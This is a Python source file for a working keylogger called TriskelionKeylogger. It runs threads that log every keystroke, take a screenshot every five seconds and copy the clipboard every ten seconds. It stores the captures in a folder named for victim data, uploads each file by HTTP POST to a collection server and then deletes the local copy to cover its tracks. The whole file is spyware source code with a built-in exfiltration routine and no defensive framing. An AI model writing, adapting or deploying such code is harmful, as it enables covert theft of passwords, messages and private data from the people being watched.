import keyboard
from threading import Thread, Event, Timer
from datetime import datetime, timedelta
import requests
import os
import pyautogui
import pyperclip as clipboard
import time

sendLogsEvery = 60
serverURL = 'http://192.168.1.7:5000/upload'

class TriskelionKeylogger:
    def __init__(self, interval):
        self.interval = interval
        self.startDateTime = datetime.now()
        self.endDateTime = datetime.now()
        self.capturedDataDir = "D:\\CapturedVictimData"
        self.stop_event = Event() 

    def sendData(self, filePath):
        with open(filePath, 'rb') as f:
            files = {'file': f}
            try:
                serverResponse = requests.post(serverURL, files=files, timeout=30)
                print(serverResponse.status_code, serverResponse.reason)
            except Exception as e:
                print(f"File failed to upload: {e}")

    def updateFileName(self, filePrefix, fileExtension):
        startDateTimeStr = str(self.startDateTime)[:-7].replace(" ", "-").replace(":", "")
        endDateTimeStr = str(self.endDateTime)[:-7].replace(" ", "-").replace(":", "")
        return f"{filePrefix}-{startDateTimeStr}_{endDateTimeStr}{fileExtension}"

    def screenshotCapture(self):
        def capture_screenshot():
            captureScreenshotEvery = 5
            while not self.stop_event.is_set():
                time.sleep(captureScreenshotEvery)
                imgName = self.updateFileName("Screenshot", ".png")
                img = pyautogui.screenshot()
                filePath = os.path.join(self.capturedDataDir, imgName)
                img.save(filePath)
                print(f"Screenshot captured to {filePath}")
                self.sendData(filePath)
                Timer(1, lambda: os.remove(filePath)).start()

        screenshotCaptureThread = Thread(target=capture_screenshot)
        screenshotCaptureThread.start()

    def keystrokeCapture(self):
        def capture_keystrokes():
            keystrokeLog = ""
            startDateTime = datetime.now()
            endDateTime = startDateTime + timedelta(seconds=60)

            def callback(event):
                nonlocal keystrokeLog
                name = event.name
                if len(name) > 1:
                    if name == "space":
                        name = " "
                    elif name == "enter":
                        name = "[ENTER]\n"
                    elif name == "decimal":
                        name = "."
                    else:
                        name = name.replace(" ", "_")
                        name = f"[{name.upper()}]"
                keystrokeLog += name

            keyboard.on_release(callback)

            print(f"Keystroke capture started at {startDateTime}")

            while datetime.now() < endDateTime and not self.stop_event.is_set():
                time.sleep(1)

            keyboard.unhook_all()

            keystrokeFileName = self.updateFileName("Keystrokes", ".txt")
            filePath = os.path.join(self.capturedDataDir, keystrokeFileName)
            with open(filePath, 'w') as file:
                file.write(keystrokeLog)
            print(f"Keystroke log saved to {filePath}")
            self.sendData(filePath)
            Timer(1, lambda: os.remove(filePath)).start()

        keystrokeCaptureThread = Thread(target=capture_keystrokes)
        keystrokeCaptureThread.start()

    def clipboardCapture(self):
        def capture_clipboard():
            captureDataEvery = 10
            while not self.stop_event.is_set():
                time.sleep(captureDataEvery)
                clipboardFileName = self.updateFileName("ClipboardCapture", ".txt")
                filePath = os.path.join(self.capturedDataDir, clipboardFileName)
                with open(filePath, 'w') as file:
                    file.write(clipboard.paste())
                print(f"Clipboard data captured to {filePath}")
                self.sendData(filePath)
                Timer(1, lambda: os.remove(filePath)).start()

        clipboardCaptureThread = Thread(target=capture_clipboard)
        clipboardCaptureThread.start()

    def stop(self):
        self.stop_event.set()

if __name__ == "__main__":
    keylogger = TriskelionKeylogger(interval=sendLogsEvery)
    keylogger.screenshotCapture()
    keylogger.keystrokeCapture()
    keylogger.clipboardCapture()

    try:
        while True:
            time.sleep(1) 
    except KeyboardInterrupt:
        print("Triskelion has been stopped.")
        keylogger.stop()
        
